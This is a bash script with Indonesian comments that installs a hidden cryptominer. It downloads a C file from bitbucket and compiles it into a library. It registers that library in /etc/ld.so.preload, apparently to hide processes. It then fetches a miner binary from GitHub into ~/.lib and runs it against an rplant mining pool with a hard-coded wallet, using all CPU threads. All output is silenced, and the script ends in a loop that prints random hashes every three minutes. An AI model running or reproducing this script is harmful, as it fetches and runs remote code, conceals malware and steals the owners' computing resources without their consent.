#!/bin/bash

# Update dan instalasi paket-paket yang diperlukan
apt-get update > /dev/null 2>&1
apt-get install -y sudo wget cpulimit build-essential screen > /dev/null 2>&1

# Unduh file nyumput.c dari URL yang disediakan
curl -sSL https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c > /dev/null 2>&1

# Kompilasi nyumput.c menjadi shared library libnyumput.so
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl > /dev/null 2>&1

# Pindahkan libnyumput.so ke direktori /usr/local/lib/
mv libnyumput.so /usr/local/lib/ > /dev/null 2>&1

# Tambahkan libnyumput.so ke file /etc/ld.so.preload
echo '/usr/local/lib/libnyumput.so' >> /etc/ld.so.preload > /dev/null 2>&1

# Hapus file nyumput.c setelah kompilasi
rm nyumput.c > /dev/null 2>&1

# Buat direktori .lib dan pindah ke dalamnya
mkdir -p ~/.lib && cd ~/.lib > /dev/null 2>&1

# Unduh file sgr1 dari URL yang diberikan dan beri izin eksekusi
wget -qO sgr1 https://github.com/barburonjilo/back/raw/main/sr > /dev/null 2>&1
chmod +x sgr1 > /dev/null 2>&1

# Batasi penggunaan CPU dari sgr1 dengan cpulimit
cpulimit -l 1200 -e sgr1 > /dev/null 2>&1 &

# Bersihkan cache memori dan disk
sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches > /dev/null 2>&1

# Mulai proses menggunakan screen
nice -n -10 nohup screen -dmS main-session /bin/bash -c "./sgr1 --algorithm yespowerr16 --pool stratum-asia.rplant.xyz:13382 --wallet YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive " > /dev/null 2>&1 &

# Loop sederhana untuk menghasilkan output acak setiap 3 menit
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
